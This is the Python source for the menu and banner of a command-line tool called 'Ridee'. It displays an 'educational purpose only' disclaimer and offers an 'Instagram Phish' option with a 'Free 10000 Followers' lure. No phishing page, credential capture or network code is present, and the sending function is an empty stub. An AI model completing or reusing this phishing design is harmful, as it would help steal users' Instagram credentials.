from colorama import Fore
import time
import os
import sys

print("\033[2J\033[H", end="", flush=True)

def style():
    print(f"{Fore.GREEN}Welcome to Ridee!")
    for i in range(50):
        time.sleep(0.009)
        print(f"{Fore.YELLOW}*", end="", flush=True)

    print("\n")

    disclaimer = f"""{Fore.RED}
    [!] {Fore.GREEN}EDUCATIONAL PURPOSE ONLY
    {Fore.LIGHTWHITE_EX}'Ridee is intended for educational and authorized testing purposes only.
    Users are solely responsible for how they use this tool.
    The developer does not endorse or accept responsibility for misuse,
    unauthorized activities, or violations of applicable laws.

    Use responsibly and only with proper authorization.'"""
    print(disclaimer.strip().replace("  ", ""))
    print("\n")
    for i in range(50):
            time.sleep(0.009)
            print(f"{Fore.YELLOW}*", end="", flush=True)
    
    print("\n")

    access = input(f"{Fore.WHITE}Continue (y/n) ")
    if access == "y":
         pass
    else:
         exit()
    
    print("\033[2J\033[H", end="", flush=True)

    asii_text = f"""{Fore.RED}
    ███████ ████  █████   ██████ ██████
    ██   ██  ██   ██  ██  ██     ██    
    ███████  ██   ██   █▌ █████  █████ 
    █████▄   ██   ██  ██▌ ██▌    ██▌   
    ██▌ ▀██ ████▌ █████ ▌ ██████ ██████
    ▌         ▌    ██ ▌  ██     ██   
                    ▐     ▐      ▐   """
    print(asii_text)
    copyright = f"""{Fore.MAGENTA}
    ------------------------------------------------------------\n
    {Fore.RED}Author {Fore.WHITE}: {Fore.GREEN}Basant
    {Fore.RED}Telegram {Fore.WHITE}: {Fore.GREEN}@alphaxworks\n {Fore.MAGENTA}
    -------------------------------------------------------------"""
    print(copyright)

style()

service = []

def menu():
     options = input(f"""{Fore.RED}
    [0] {Fore.CYAN}Instagram Phish
    
    {Fore.WHITE}Choose a service! """)
     if options == "0":
          service.append(0)
          print("\033[2J\033[H", end="", flush=True)
          text = f"""    {Fore.BLUE}                                                                               
██ ▄▄  ▄▄  ▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄   ▄▄▄▄ ▄▄▄▄   ▄▄▄  ▄▄   ▄▄   █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄  
██ ███▄██ ███▄▄   ██  ██▀██ ██ ▄▄ ██▄█▄ ██▀██ ██▀▄▀██   ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ ██▄▄  ██▄█▄ 
██ ██ ▀██ ▄▄██▀   ██  ██▀██ ▀███▀ ██ ██ ██▀██ ██   ██   ██     ██ ██ ██ ▄▄██▀ ██ ██ ██▄▄▄ ██ ██ 
                                                                                                """

          print(text)
          services = input(f"""
          {Fore.RED}[0] {Fore.GREEN}Free 10000 Followers
          """)
          if services == "0":
               service.append(0)
          
menu()

def send_urls():
     pass
print(service)